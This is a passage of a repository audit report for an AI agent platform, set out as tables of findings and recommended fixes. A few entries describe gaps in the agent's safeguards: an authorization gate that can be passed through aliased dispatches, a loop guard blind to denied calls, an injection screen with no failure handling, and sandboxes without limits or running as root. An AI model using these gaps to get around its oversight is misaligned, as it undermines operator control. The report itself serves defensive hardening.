
### dashboard/external_gateway + goal rate limit (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-28 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/external_gateway.py:547` | Pre-authentication rate limits are keyed by request.client.host, which collapses to one bucket behind a non-loopback proxy | Derive the client key from the trusted-proxy-resolved peer (tie to the same forwarded_allow_ips policy) and add a per-token/per-tenant dimension where a credential is present (vendor token hash, agent id) so a shared IP cannot starve others. | S |

### dashboard/goal_feedback_store (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-27 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-dashboard/maverick_dashboard/goal_feedback_store.py:23` | goal_feedback_store reads only the last 5,000 NDJSON rows: earlier ratings vanish and /flywheel human_feedback undercounts once the file grows | Keep a compact per-goal index (JSON dict goal_id -> latest row, rewritten atomically) alongside the NDJSON, or periodically compact the file to latest-per-goal; count() should read the index. At minimum expose a warning when the file exceeds _MAX_ROWS. | S |

### dashboard/i18n + base.html (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-36 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-dashboard/maverick_dashboard/i18n.py:3` | i18n: the language switcher (fr/de/ja/zh/ar) translates only ~3 visible strings; nav/label/action catalog keys are unused and nav labels are hard-coded English | Either wire t() into the nav group/page labels (translate ui_visibility labels via keys) and the common buttons, or remove the unused catalog keys and reword the selector/docs as 'language of the font/accessibility labels only' until a real catalog lands. | L |

### dashboard/oversight (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-74 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-dashboard/maverick_dashboard/templates/oversight.html:143` | Oversight page replaces the whole live table via innerHTML every 5 seconds, destroying keyboard focus on its buttons | Diff-render: keep rows keyed by goal id (update textContent of existing cells, add/remove rows), or at minimum skip the re-render when document.activeElement is inside box and when document.hidden. Add aria-busy during refresh. | S |

### dashboard/pages (shoring) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-11 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/shoring_page.py:33` | shoring_page async handler performs synchronous SQLite world reads on the event loop | Make the handler `def` (FastAPI runs it in the threadpool) or wrap the two calls in `await run_in_threadpool(...)`. | S |

### dashboard/schedulers (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-8 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/red_team_scheduler.py:75` | 10 of 15 background scheduler loops use fixed polling with no backoff or jitter on repeated failure | Extract one BoundedPollLoop helper (poll, max_backoff, jitter, consecutive-failure counter exposed in status()) and use it from every start_*/attach_* scheduler; log at WARNING on first failure and DEBUG thereafter until recovery. | M |
| W3-17 | improvement | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-dashboard/maverick_dashboard/app.py:557` | 15 background schedulers have two different lifecycle styles and no unified registry or readiness aggregation | Introduce a SchedulerRegistry on app.state with register(name, start, stop, status) used by both styles; start/stop all from one lifespan block; expose the aggregated status on an admin-only /api/v1/admin/schedulers route and a summarized flag in /readyz. | M |

### dashboard/schedulers (consent scan) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-9 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/consent_scan_scheduler.py:706` | consent_scan_scheduler reports configured_enabled=False after any transient cycle exception | Drop configured_enabled=False from the except branch (keep last_error_code) or record a separate last_cycle_failed flag; add a test asserting configured_enabled stays True across a raising run_cycle. | S |

### dashboard/static (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-77 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/app.py:9310` | No response compression and no fingerprinted asset URLs: every cold page load ships ~164 KB of uncompressed shell CSS/JS with a 5-minute cache | Add starlette.middleware.gzip.GZipMiddleware(minimum_size=1024) behind a [dashboard] compress knob (kernel rule 5); append a content hash (e.g. ?v=<sha256[:8]> computed once at import from the file bytes) to /static links in base.html and set max-age=31536000, immutable on the versioned routes. Optionally minify the two shell bundles in the wheel build. | S |

### dashboard/suite-apis (branding) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-13 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-dashboard/maverick_dashboard/trust_center_branding_api.py:335` | trust_center_branding expire_domains accepts an unbounded `limit` query int while siblings declare Query(ge=, le=) bounds | Change to `limit: int = Query(100, ge=1, le=500)` mirroring the store bound. | S |

### dashboard/suite-apis (customer sandboxes) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-12 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-dashboard/maverick_dashboard/customer_sandbox_api.py:59` | customer_sandbox_api attributes every static-bearer/auth-off sandbox lifecycle operation to a constant synthetic actor | When caller_principal() is None, require the static-bearer case to be labelled (e.g. include a hashed token fingerprint or a required X-Lightwork-Actor header) or refuse with 401 like the other admin authorities; record the auth mode alongside principal_ref in the lifecycle store. | S |

### dashboard/suite-apis (error disclosure) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-5 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/cortex_api.py:115` | OSError/RuntimeError text (including filesystem paths) reflected into 503 responses in cortex, shoring and trust-receipts APIs | Replace the interpolated detail with a fixed string and log.exception the original (matching vendor_onboarding_api._call); optionally return an error code enum. | S |

### dashboard/tests (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-19 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-dashboard/tests/test_learning.py:69` | Test gap: settings_store overlay serialiser has no round-trip test across every writer, which is why the dropped sections went unnoticed | Add a parametrized test that, for each public set_* function in settings_store, performs a write into a temp MAVERICK_HOME and asserts the value survives load_overlay(); include a meta-test asserting every SWITCHABLE_SECTIONS entry appears in the _dump section tuple. | S |
| W5-84 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-dashboard/tests/test_ui_visibility_fresh_process_smoke.py:173` | Fresh-process UI smoke test replaces HOME, so user-site-installed dependencies vanish in the child and the test fails with 'jinja2 must be installed' | Preserve the parent's site directories: add `PYTHONUSERBASE=site.USER_BASE` to the child env (or append `site.getusersitepackages()` to the PYTHONPATH it already builds) so HOME isolation does not change import resolution. | S |

### dashboard/tests (auth) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-31 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-dashboard/tests/test_proxy_auth_gate.py:1` | Auth tests never run behind uvicorn's ProxyHeadersMiddleware, so client-address-dependent gates (proxy_trusts, loopback no-token mode, rate-limit keys) are untested in their production shape | Add a test fixture that wraps app in uvicorn.middleware.proxy_headers.ProxyHeadersMiddleware(trusted_hosts='127.0.0.1') and drives it with httpx.ASGITransport(client=('127.0.0.1', n)) (pattern in scratch proof3.py); cover: XFF spoof of a pinned proxy is refused, documented loopback config works with XFF present, no-token mode with XFF from loopback requires a token. | S |

### deploy/homebrew (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-51 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `deploy/homebrew/maverick.rb:22` | Homebrew formula is a placeholder pointing at a PyPI tarball (0.1.6, all-zero sha256) that the docs say must not be used | Either remove deploy/homebrew until PyPI names are reserved, or make the formula install from a pinned GitHub source archive with a real sha256 and have test_release_packaging.py assert the version matches. | S |

### deploy/reference-architectures (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-50 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `deploy/reference-architectures/README.md:11` | Two divergent Fly.io reference architectures (fly/ and flyio/) — the index README lists only one | Delete deploy/reference-architectures/flyio/ (or merge its concurrency block into fly/) and have test_reference_architectures.py assert every subdirectory is listed in README.md. | S |
| W5-49 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `deploy/reference-architectures/ecs/README.md:17` | ECS reference README documents only the API-key SSM parameter, but the task definition also requires /maverick/dashboard-token — task fails to start | Add a second put-parameter for /maverick/dashboard-token (`openssl rand -hex 32`) to step 2 and pluralize the IAM note. | S |

### deploy/relay (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-46 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `deploy/relay/relay.py:89` | Relay: malformed Content-Length still raises an uncaught ValueError (500) instead of a clean 4xx — prior finding unresolved | Wrap in try/except (TypeError, ValueError) returning 411/400 as the prior audit suggested; add a test case to tests/test_relay_signature.py. | S |
| W5-47 | low | Raised (finder cited evidence; skeptic pass not run); prior | correctness | `deploy/relay/relay.py:107` | Relay forwards caller-supplied 'budget' unvalidated — prior finding unresolved | Coerce with float(), reject NaN/inf/negatives, clamp to a configurable ceiling (MAVERICK_RELAY_MAX_BUDGET), return 400 otherwise. | S |

### dev-workflow/pre-push (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-13 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `scripts/pre-push-lint.sh:2` | scripts/pre-push-lint.sh claims to mirror the CI lint job but omits 10 of its 15 custom gates; CLAUDE.md says '7 custom CI gates' | Generate the gate list from one place: move the gate commands into a small `scripts/ci_gates.txt` (or a Python list) consumed by both ci.yml (via a loop) and pre-push-lint.sh, and add a test that parses ci.yml's lint job and asserts pre-push-lint.sh contains every `python -m maverick.* --ci` line. Update CLAUDE.md's count. | S |

### docs/CLAUDE.md (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-74 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `CLAUDE.md:207` | Stale suite-size claims in CLAUDE.md and ci.yml (9,094 / ~24,700 vs 26,402 collected) | Replace hard numbers with the command that prints them (`python3 -m pytest --co -q \| tail -1`) or regenerate the figure in the harness run that writes CLAUDE.md. | S |

### docs/clients (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-124 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/clients/typescript-quickstart.md:163` | Client quickstarts cite a wrong source path for the MCP HTTP transport | Correct the three quickstarts to `packages/maverick-mcp/maverick_mcp/http_transport.py`. | S |

### docs/env-vars (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-123 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/env-vars.md:4` | docs/env-vars.md documents 125 of the 331 MAVERICK_* variables read by non-test code; 140 (incl. auth/encryption/audit-key knobs) are documented nowhere | Generate an appendix of env vars from a registry (or the grep above) and gate it in CI; at minimum document the auth/encryption/audit/KMS/gRPC/A2A knobs listed here in env-vars.md and docs/security-hardening.md. | M |

### docs/press-kit (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-120 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/press-kit.md:85` | Press kit says the product name is 'Lightwork, capital M' and attributes the maker to 'Day AI Labs' while README/logo say 'Daybreak Labs' | Fix 'capital M' -> 'capital L', settle on one legal/brand name across README, TRADEMARK.md, LICENSE and press-kit, and mention the `lightwork` alias. | S |

### docs/providers (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-117 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/press-kit.md:31` | Provider count '12 LLM providers' in seven customer-facing docs vs FEATURES.md '13 providers' and 14 adapter modules | Pick one authoritative count (FEATURES.md) and update README, press-kit, comparison, handbook, docs/architecture.md; or make the numbers generated (a doc-count test over `providers/` and `tools/`). | S |

### docs/safety (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-118 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/safety.md:30` | Built-in shield rule count understated: '~20' in safety.md/ARCHITECTURE.md vs 40 rules in builtin_rules.py | Replace '~20' with the live count (or 'see `python -c "from maverick_shield import builtin_rules; print(len(builtin_rules.RULES))"`') in docs/safety.md:30,74 and ARCHITECTURE.md:66. | S |

### docs/security-hardening (exemptions) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-26 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `docs/security-hardening.md:444` | docs exempt-path list omits most auth-exempt surfaces (A2A, LLM gateway, consent webhook, share/form/dsar/SCIM/SAML/invite/external/public prefixes) | Generate this section from the code (a tiny script that prints _AUTH_EXEMPT + the prefixes, with the self-auth mechanism for each) and add a test that fails when the doc and the sets diverge. | S |

### governance suite (all privacy_*/data_use_* modules) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-53 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/privacy_data_discovery_remediation.py:216` | 118 same-name helpers copy-pasted across the 23 modules with silently divergent semantics | Extract one `maverick/governance_common.py` (canonical JSON, sha256/HMAC digests, timestamp/integer bounds, tenant canonicalisation, env/secret-provider key resolvers, sqlite connect+BEGIN IMMEDIATE helper with a single PRAGMA policy, config-gate builder parameterised by section names and error class). Migrate module by module with the existing tests as the safety net; keep per-module exception classes by passing them in. | L |

### kernel/agent-loop budget (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-41 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/agent.py:3487` | Synthesis-reserve early stop returns a worker's partial scratch text as a normal FINAL, indistinguishable from a completed answer | Mark the result (e.g. `AgentResult(final=partial, error='stopped early: synthesis reserve')` or a `partial=True` flag) and have _run_child_and_report/_format_swarm_results prefix the child line with '[PARTIAL -- stopped for synthesis reserve]' so the parent weighs it accordingly; exclude partials from disagreement/credit scoring. | S |

### kernel/agent-loop gates (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-34 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/agent.py:2784` | Loop guard is blind to denied/blocked calls: a model re-issuing the same shield/capability/governance-denied call is never nudged or suppressed and writes an audit row per repeat | Feed denial strings through _track_identical_call/_loop_guard_note as well (they are byte-identical results by construction) so the nudge and the suppression tier apply to denied calls; consider a cheaper 'already denied N times' short-circuit before re-running the gate chain. | S |

### kernel/budget (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-32 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/budget.py:729` | budget_from_config crashes with OverflowError on `max_tool_calls = inf` / `max_input_tokens = inf`, and Budget never coerces a non-finite max_tool_calls | Add OverflowError to the except tuple at 736 and reject non-finite values before casting to int; add max_tool_calls to the __post_init__ coercion loop with its default of 500; extend test_budget_config_and_finite.py with inf/nan for every int key. | S |

### kernel/checkpoint (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-35 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/checkpoint.py:136` | Per-step durable checkpoints re-serialize the entire message history (including base64 image attachments) every turn -- O(n^2) SQLite writes | Store attachments by reference (goal attachment id) in checkpoints and re-materialize on resume; write incremental deltas (new messages since last checkpoint keyed by step) or at least skip the write when the serialized payload is unchanged; add a size cap with a warning. | M |

### kernel/dispatch_contract (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-38 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/dispatch_contract.py:159` | dispatch_contract 'gated' detection is name-based and per-function, so a dispatch can pass the gate without being authorized | Detect dispatches by type/flow rather than receiver name (any value produced by base_registry()/ToolRegistry() or annotated ToolRegistry), require that the guarding authorize() call precedes the run() in the same block and passes the same first argument expression, and add negative fixtures for the alias/getattr shapes to test_dispatch_contract. | M |

### orchestrator/result rendering (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-33 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/orchestrator.py:1671` | A review-checkpoint stop is reported as 'a HALT file is present -- run maverick unhalt' because the orchestrator classifies any error containing 'halt' | Return structured stop reasons on AgentResult (e.g. `stop_kind: 'killswitch' \| 'review_checkpoint' \| 'budget' \| 'max_steps'`) and branch on it instead of substring matching; render a dedicated message for review-checkpoint stops that names the reason/value and how to continue (`maverick resume`). | S |

### packages/pyproject-metadata (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-97 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-mcp/pyproject.toml:30` | Package metadata is inconsistent across the 8 distributions (classifiers/URLs only on core; maverick-knowledge has no README or readme field) | Copy core's `classifiers` and `[project.urls]` block into the seven sibling pyprojects (or generate them from release-cohort.toml), add a README.md + `readme` to maverick-knowledge, and add `Programming Language :: Python :: 3 :: Only` plus either a `<3.13` cap or a 3.13 CI leg. | S |

### providers + tools defaults (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-18 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/providers/openai_provider.py:126` | Hard-coded / stale model ids outside ROLE_MODELS (kernel rule 2): gpt-4o default, dated Bedrock id, llama-3.3 OpenRouter default, verifier panel, vertex gemini-2.5-pro, wizard gemini-pro-1.5 | Route every default through llm.MODEL_CATALOG / ROLE_MODELS (e.g. DEFAULT_MODEL = MODEL_CATALOG['openai'][0]) and add a CI check that every literal model id in packages/apps exists in MODEL_PRICING_PROVIDER.rates or is explicitly exempted. | S |

### providers/openai usage accounting (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-17 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/providers/openai_provider.py:74` | Malformed provider usage is reported to the operator as 'BudgetExceeded' | Introduce a distinct UsageAccountingError (subclass of a neutral ProviderError, still non-retryable) with the gateway name and field in the message; keep BudgetExceeded for actual cap breaches. | S |

### release/docker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-20 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `.github/workflows/release.yml:201` | Release image build writes a GHA buildx cache under tag scope that no later release can read, while consuming any main-scope cache | Remove cache-from/cache-to from the release docker-image job (cold builds are the reproducibility-friendly choice for a signed artifact), or if speed matters pin `scope=release` and only ever write it from the same release workflow. | S |

### release/native (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-15 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/workflows/native.yml:455` | Native wheels and the wasm npm package are published without SBOM or Sigstore signatures, unlike the Python cohort | In native.yml add `cargo auditable build` (embeds the dependency list in the binary) and/or generate a CycloneDX SBOM with `cargo cyclonedx`, sign wheels/tarball with `cosign sign-blob --bundle`, and attach SBOM + bundles to a `native-vX` GitHub Release; reference them from docs/DISTRIBUTION.md. | M |

### release/versioning (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-22 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `deploy/helm/maverick/Chart.yaml:9` | Component versions are out of step with the 0.1.7 cohort (Rust workspace 0.1.0, Helm chart 0.1.0, plugin-ts 0.1.0, mobile 0.1.0) | Decide which components are lockstep (Helm chart, plugin SDK likely are) and add them to release-cohort.toml-driven checks in test_release_packaging.py; for intentionally independent ones (Rust native), document the compatibility matrix in docs/DISTRIBUTION.md. | S |

### repo/CLAUDE.md (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-15 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `CLAUDE.md:117` | CLAUDE.md's '~30 grandfathered # noqa: C901' is stale: 49 in the dashboard suite modules alone, 149 across packages/ and apps/ | Update the number in CLAUDE.md and add a CI ratchet (count of `noqa: C901` may not increase) or a ruff per-file-ignores list so new waivers are explicit. | S |

### repo/agent-docs (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-80 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `AGENTS.md:33` | AGENTS.md / CLAUDE.md / pyproject carry stale, contradictory facts about the lint config and suite (bugbear 'off', '~30' C901 noqa, '9094 tests') | Update AGENTS.md rule 8 to 'B is ON; fix B findings your diff introduces', refresh the suite count/time in both files, and replace the '~30' with the real count (or, better, drop the number and reference `grep -rc 'noqa: C901'`). Consider adding a tiny test that greps AGENTS.md/CLAUDE.md for the select list so they cannot silently diverge from pyproject. | S |

### repo/gitignore (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-91 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `.gitignore:7` | `.gitignore` ignores the tracked `build/` directory (and any `lib/`, `out/`), so new files there are silently dropped from `git add` | Anchor the Python build-artefact patterns (`/build/`, `/lib/`, `/lib64/`, `/out/`) and add `!/build/` for the PyInstaller directory, or rename it to `packaging/pyinstaller/`. | S |

### repo/lint-hygiene (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-86 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `benchmarks/bon_smoke.py:21` | 734 stale or cargo-cult `# noqa` directives, including ~184 that suppress enabled rules which no longer fire | Add `RUF100` to `select` and run `python -m ruff check --fix --select RUF100 .` once (all 734 are safe autofixes); keep the rule on so suppressions stay honest. Decide explicitly whether SLF001/BLE001/S608 should be enabled (finding above) rather than half-enabled via noqa. | S |

### repo/packaging (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-92 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `pyproject.toml:5` | uv workspace is declared but unused anywhere (uv.lock ignored, no uv in CI/devcontainer) while the docs call the repo a 'uv-workspace monorepo' | Either adopt uv for real — commit `uv.lock`, use `uv sync --all-packages` in post-create.sh and the test-shard action, derive requirements/ci.txt from it — or delete the `[tool.uv.*]` tables and reword CLAUDE.md/AGENTS.md to 'pip-installed monorepo (8 packages), constraints in requirements/ci.txt'. | M |

### repo/pitch (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-95 | low | Raised (finder cited evidence; skeptic pass not run); prior | maintainability | `pitch/README.md:1` | Investor decks and other binary pitch assets (~4.2 MB, 16% of the pack) are versioned in the code repository | Track the PDFs with git-lfs (or drop them and keep only the markdown sources + a build step), add `*.pdf *.png *.jpg binary` to .gitattributes, and consider moving the `pitch/` tree to a separate marketing repository. | S |

### repo/pytest-config (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-98 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `pyproject.toml:99` | No pytest timeout configured for local runs; only CI passes --timeout=180, so a hung test hangs the developer's suite indefinitely | Add `timeout = 180` and `timeout_method = "signal"` under `[tool.pytest.ini_options]` (CI's explicit flags remain a no-op override), and add pytest-timeout to the `[dev]` extra and post-create.sh; optionally add `--durations=25` to a `just test` target so slow files are visible locally as they are in CI. | S |

### repo/root (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-94 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `Daybreak Labs Logo.jpg:1` | `Daybreak Labs Logo.jpg` at the repo root is a byte-identical, unreferenced duplicate of the dashboard's static logo | `git rm 'Daybreak Labs Logo.jpg'`; if a brand asset is wanted outside the dashboard, keep it under `pitch/site/` (which already has daybreak-logo.png) and reference it from README. | S |
| W5-93 | improvement | Raised (finder cited evidence; skeptic pass not run) | maintainability | `CODE_QUALITY_AUDIT.md:1` | Root directory clutter: eight audit/QA reports (≈380 KB) sit beside the README | Move them to `docs/audits/<YYYY-MM>-<name>.md` with a `docs/audits/README.md` index, leave a one-line pointer in CLAUDE.md, and add a `check_root_layout` test that whitelists the allowed root files so reports cannot accumulate again. | S |

### safety/pii_detector (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-38 | low | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/safety/pii_detector.py:295` | IBAN is not detected as PII (misclassified as a credit card / partly relies on Luhn) | Add an IBAN pattern (`\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b` with the ISO 7064 mod-97 checksum) as its own PIIMatch kind='iban'; consider SWIFT/BIC too. Keep the credit-card rule Luhn-gated so the two don't collide. | S |

### safety/voice_safety (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-40 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/safety/voice_safety.py:494` | voice_safety.scan_transcript claims module-wide fail-open but has no exception guard | Wrap scan_transcript's body in try/except returning a documented default (fail-open TranscriptVerdict(ok=True) OR, for a safety screen on untrusted inbound audio, fail-closed with a reason) — and make the docstring match whichever direction is chosen. For an inbound injection screen fail-closed is the defensible choice; update the docstring accordingly. | S |

### sandbox/firecracker (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-98 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/sandbox/firecracker.py:227` | Firecracker local path still runs commands with no workspace mount (unresolved prior finding) and passes a command form firectl does not accept | Keep the experimental label; either implement guest agent + vsock/virtiofs transfer or remove `provider=local` from build_sandbox until it works. Verify flags against firectl --help before shipping. | L |
| W1-97 | low | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/sandbox/firecracker.py:260` | Firecracker docker fallback runs as root with no memory cap and unbounded output while claiming to be 'at least as contained as the plain Docker backend' | Reuse DockerBackend._container_flags (or construct a DockerBackend with read-only workdir) for the fallback, and apply the [-8000:]/[-2000:] truncation in both _firectl and _docker_fallback. | S |

### sandbox/local (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-109 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/sandbox/local.py:367` | LocalBackend leaves the POSIX process group running when exec() is interrupted by a non-timeout exception | Move the POSIX killpg into the finally block (guarded by proc.poll() is None or unconditionally, as the success path already does) so every exit path reaps the group. | S |
| W1-106 | improvement | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/sandbox/local.py:299` | LocalBackend applies no resource limits at all — fork bombs, memory hogs and huge files hit the host unbounded on the default backend | Add [sandbox] local_limits (pids, memory_mb, fsize_mb) applied via preexec_fn=lambda: resource.setrlimit(...) on POSIX (Job Object limits already exist on Windows via _ExtendedLimitInformation — set ProcessMemoryLimit/ActiveProcessLimit there). Wire a wizard step per kernel rules 5-6. | S |

### sandbox/local+ssh (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-100 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/sandbox/local.py:306` | LocalBackend and SSHBackend children inherit the harness's stdin — stdin-reading commands block until timeout and can consume CLI input | Pass stdin=subprocess.DEVNULL in LocalBackend.exec, add `-n` to the ssh argv, and drop `-i` from kubectl run (or feed DEVNULL). Add a test that `cat` returns immediately with exit 0 and empty output. | S |

### sandbox/podman (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-105 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/sandbox/podman.py:85` | Podman backend mounts the workspace with :Z, recursively relabelling whatever directory workdir points at (default: the CLI's cwd) | Use `:z` (shared label) or `--security-opt label=disable`, and refuse/warn when workdir resolves to $HOME, / or another non-project directory. Document the SELinux behaviour. | S |

### shield/builtin_rules + benchmarks/security (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
